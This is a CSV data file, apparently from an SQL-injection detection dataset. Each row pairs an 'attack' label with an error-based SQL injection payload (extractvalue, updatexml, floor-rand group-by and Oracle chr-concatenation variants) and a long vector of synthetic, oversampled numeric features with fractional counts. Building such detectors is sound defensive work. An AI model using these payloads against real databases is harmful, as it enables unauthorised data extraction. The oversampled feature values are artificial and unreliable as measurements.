id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000152,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000128,0.0967573052939646,240.01919337871027,40.97115274643266,3.9182882389458076,73.68268021075922,44.76922197146124,96.59613845005717,24.971152746432658,0.3069758778994209,0.18649184743681113,0.40244567941004433,0.10408659525372368,0.0,1.0,1.0,0.0,1.0,1.9711527464326555,0.0,15.971152746432654,0.02884725356734455,-1.1102230246251565e-16,3.0,3.9711527464326557,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.9711527464326555,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.971152746432655
SMOTE_000153,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",nearest_attack_euclidean,R000105,0.9030615863185298,222.77307100101783,32.7824057659791,3.785200202452298,71.56014414947757,36.564811531958206,88.30089802164474,26.347217297937306,0.3193960754937907,0.16518984401468922,0.39667235929091293,0.11874172120060712,0.0,4.0,0.0,0.0,1.1102230246251565e-16,1.7824057659791024,0.0,15.564811531958204,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,1.782405765979103,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.2175942340208976,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7824057659791025,0.7824057659791025,4.782405765979103
SMOTE_000154,attack,error,"-6085 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000156,1.5830023600471315,331.37929086532586,33.0,3.4729734544935957,80.45976362177528,50.620709134674165,143.83905448710112,56.45976362177528,0.24280078920702317,0.1527810618750162,0.43404339501198563,0.17037475390597503,0.45976362177527896,0.0,0.5402363782247208,0.0,1.1102230246251565e-16,2.0,0.0,30.45976362177528,2.7755575615628914e-17,-1.1102230246251565e-16,1.0,22.54023637822472,0.4597636217752791,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.4597636217752791,0.5402363782247208,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000155,attack,error,"-9176'   )    )    as eunw where 5978  =  5978 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000129,0.8611248171924228,230.4223033758975,40.69778009645422,3.902738900248106,70.67558106099636,42.58224077163372,92.76892135035901,24.39556019290843,0.3066826045579444,0.18457310506482572,0.4026174640046421,0.1061268263725878,1.0,0.0,1.0,0.0,1.0,1.6977800964542151,0.0,15.697780096454215,2.7755575615628914e-17,-1.1102230246251565e-16,3.0,3.6977800964542147,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.6977800964542151,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.697780096454215
SMOTE_000156,attack,error,"1   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   9325  =  9325",nearest_attack_euclidean,R000106,0.6085286387320118,335.1671898082045,36.75920113242172,3.8211033040367144,101.75920113242172,63.0,134.92639094062622,35.481597735156555,0.30366121047942307,0.18799033280722052,0.40250120241941356,0.10584725429394284,0.0,0.0,0.0,0.0,2.0,2.0,0.0,24.481597735156555,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,5.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.7592011324217227,0.24079886757827731,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000157,attack,error,"1'+  (  select vvet where 5221  =  5221 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",nearest_attack_euclidean,R000149,0.7035449051943774,209.2944655854039,33.60651486795889,3.7329195247743447,57.03257433979445,41.37719796214389,83.6716635475478,27.21302973591778,0.2722588150416848,0.19915776290184495,0.3985870140336892,0.12999640802278103,2.0,0.0,0.0,0.0,0.8032574339794449,2.0,0.0,15.213029735917779,2.7755575615628914e-17,-1.1102230246251565e-16,4.393485132041111,4.803257433979445,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.60651486795889,0.0,1.0,0.803257433979445,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.409772301938335
SMOTE_000158,attack,error,-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,nearest_attack_euclidean,R000068,0.8257225441032429,330.4053195004512,35.8006649375564,3.6696685765746047,91.20265975022559,48.0,134.4019948126692,56.80066493755639,0.27601139412309783,0.14528990651474735,0.406782167050101,0.17191653231205384,0.19933506244360277,0.0,2.6013298751127945,0.0,1.1102230246251565e-16,2.0,0.0,28.0,2.7755575615628914e-17,3.0,0.0,24.601329875112796,0.19933506244360277,0.0,0.8006649375563972,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000159,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'ctac' like 'ctac",nearest_attack_euclidean,R000103,0.6216802305533192,212.6673656658916,31.703626037123158,3.928697651878686,79.81450414849263,37.0,72.96373962876842,22.889121888630527,0.3756031583441234,0.174044519903501,0.3428064736992598,0.10754584805311582,4.0,0.0,0.0,0.0,1.1102230246251565e-16,1.2963739628768427,0.0,12.592747925753686,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,1.2963739628768423,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000160,attack,error,"1  )   as zhvx where 3171  =  3171 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000089,0.20467921576022496,222.08525840189952,32.0,3.9236533960320905,77.0,45.0,78.0,22.085258401899512,0.3467142387398242,0.20262520445833884,0.3512170210611206,0.09944353574071634,0.0,0.08525840189951284,2.0,0.0,1.1102230246251565e-16,2.0,0.0,13.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,4.0,0.0,0.08525840189951284,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000161,attack,error,"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'yqhk'  =  'yqhk",nearest_attack_euclidean,R000063,0.7151410038164934,194.72711773635586,29.45423547271176,3.5566051436583,45.54576452728824,37.90847094542352,83.54576452728824,27.72711773635588,0.2339070521989213,0.19465488349563065,0.42905295560940176,0.14238510869604631,4.0,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,16.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.727117736355879,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.7271177363558792,0.2728822636441207,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000162,attack,error,"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",nearest_attack_euclidean,R000042,0.8138201071456637,334.0336524419908,36.51954440595712,3.794056384016299,101.17318146865237,61.61454825078101,135.28501153447166,35.96091118808576,0.30385480051404734,0.18448766593489888,0.4040691574844773,0.10758837606657647,0.0,0.0,0.0,0.0,2.0,1.8268185313476264,0.0,24.96091118808576,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.826818531347627,0.0,0.0,0.0,0.1731814686523735,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,0.8268185313476266,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.826818531347627
SMOTE_000163,attack,error,"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'wfws'  =  'wfws",nearest_attack_euclidean,R000046,0.20662562952516816,284.3238454030379,36.046263629005416,3.9632865624640665,107.58362733895126,35.0,105.55516354806498,36.18505451602166,0.37842765186503635,0.12310228704919503,0.3712146396632723,0.12725542142249632,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.09252725801083,0.0925272580108305,2.0,5.0,4.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,1.953736370994585,0.0462636290054152,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000164,attack,error,"1""  )   as mwja where 7881  =  7881 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000132,0.41688308634944965,324.6395666436269,40.83139761740192,4.04956983386829,108.81978332181345,63.0,117.98838570441153,34.83139761740192,0.3351576126802282,0.19411346544197425,0.3634267735024667,0.10730214837533084,0.0,1.0,2.0,0.0,2.0,2.0,0.0,20.831397617401922,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,7.0,0.0,1.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,1.0,1.0,0.8313976174019214,0.16860238259807864,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000165,attack,error,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvbv'  =  'fvbv",nearest_attack_euclidean,R000133,0.7087315474785587,338.282220511701,38.0,3.8997889939199264,109.93548842282412,55.0,133.9838368288191,39.36289526005779,0.3257854896537492,0.16287907322255668,0.39514685821180046,0.1161885789118936,4.0,0.0,0.0,0.0,2.0,1.7661278942939702,0.0,24.59676736576382,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.76612789429397,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000166,attack,error,"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'sloy'  =  'sloy",nearest_attack_euclidean,R000075,0.8038544244487204,324.7787627809212,38.490781782538384,3.9640552144396914,110.0,55.0,122.81563565076767,36.96312713015354,0.3391543130430947,0.16957715652154734,0.37753049141026523,0.1137380390250928,4.0,0.0,0.0,0.0,2.0,2.0,0.0,21.963127130153534,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,5.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000167,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000052,0.07719758355886366,334.0243571462497,33.80487142924995,3.4785195273580447,80.0,52.0,145.21948571699977,56.80487142924994,0.2395119984468568,0.15568279899045692,0.43474420236854333,0.17006100019414291,0.0,0.0,1.0,0.0,1.1102230246251565e-16,2.0,0.0,30.804871429249946,2.7755575615628914e-17,-1.1102230246251565e-16,1.0,22.999999999999996,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000168,attack,error,"-2852%'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000151,0.13583783285353243,207.42324098106113,40.85891967297962,3.895621983101763,63.0,37.0,83.42324098106114,24.0,0.3037430726949525,0.17838878872560698,0.4021564918385063,0.11571164674093426,1.0,0.0,1.0,0.0,1.0,1.0,0.0,15.07054016351019,0.9294598364898099,-1.1102230246251565e-16,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000169,attack,error,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'ejul'  =  'ejul",nearest_attack_euclidean,R000012,0.12217701706784967,345.19571376676936,38.946932757846156,3.8472916637155117,110.0,55.0,139.5141172196924,40.68159654707694,0.31883024266101384,0.15941512133050692,0.4039351726263342,0.11781946338214505,4.0,0.0,0.0,0.0,2.0,2.0,0.0,25.681596547076943,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,5.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000170,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau",nearest_attack_euclidean,R000100,0.9769497934488749,212.29269147544534,30.50316233151447,3.8389109969649553,74.26739282332959,37.0,77.51581165757236,23.509486994543412,0.34964853940020657,0.17485184587634423,0.36511956418789754,0.11038005053555158,3.006324663028941,0.0,0.0,0.0,1.1102230246251565e-16,1.7515811657572353,0.0,13.751581165757235,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,1.7515811657572353,0.7515811657572353,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.7515811657572353,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.751581165757235
SMOTE_000171,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mwyu'  =  'mwyu",nearest_attack_euclidean,R000017,0.26136326817567346,187.52317079790325,30.0,3.627369027017811,47.24304876062903,36.00926831916129,78.51390247874194,25.75695123937097,0.2522204247378244,0.19191694140313864,0.4185942566078645,0.13726837725117252,4.0,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,14.504634159580647,2.7755575615628914e-17,-1.1102230246251565e-16,5.252317079790323,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000172,attack,error,"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'xzlx' like 'xzlx",nearest_attack_euclidean,R000125,0.8306946490688553,316.14809167964086,38.57175572997755,3.9901478329357634,110.00229010984287,55.0,116.43053437986532,34.71526718993265,0.3477812746234276,0.1742880316366086,0.3682661442322219,0.10966454950774183,3.1435114599551053,0.0,0.0,0.0,2.0,1.0,0.0,21.571755729977554,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.0,0.7858778649887763,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.0,0.7858778649887763,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.785877864988777
SMOTE_000173,attack,error,"-4095'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000108,0.13291762319602884,204.96070505835124,39.58428202334049,3.881427313966115,63.0,37.0,82.16856404668098,22.792141011670246,0.307406549324346,0.1805403543650921,0.40085943278203956,0.11119366352852227,1.0,0.0,1.0,0.0,1.0,1.0,0.0,14.792141011670246,2.7755575615628914e-17,-1.1102230246251565e-16,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000174,attack,error,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000146,0.01676213659278331,343.0163415942177,33.99673168115647,3.5381881303284635,84.02614655074827,48.98692672462587,148.0,62.003268318843524,0.2449615928838877,0.1428128676018733,0.4314666184448895,0.18075892106934952,0.01307327537413161,3.986926724625868,0.0,0.0,1.1102230246251565e-16,3.0,0.0,30.0,2.0,0.009804956530598763,0.9967316811564668,22.999999999999996,0.003268318843532847,0.9967316811564669,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000175,attack,error,"1""  )   as zbhs where 2017  =  2017 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000087,0.8153881307978107,326.33721000861374,40.33721000861375,4.032329751271923,109.33721000861375,63.0,119.0,35.0,0.33504225597896087,0.19305224826417267,0.36465424672121505,0.10725124903565147,0.0,1.0,2.0,0.0,2.0,2.0,0.0,21.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,7.0,0.0,1.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,1.0,1.0,0.33721000861375017,0.6627899913862498,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
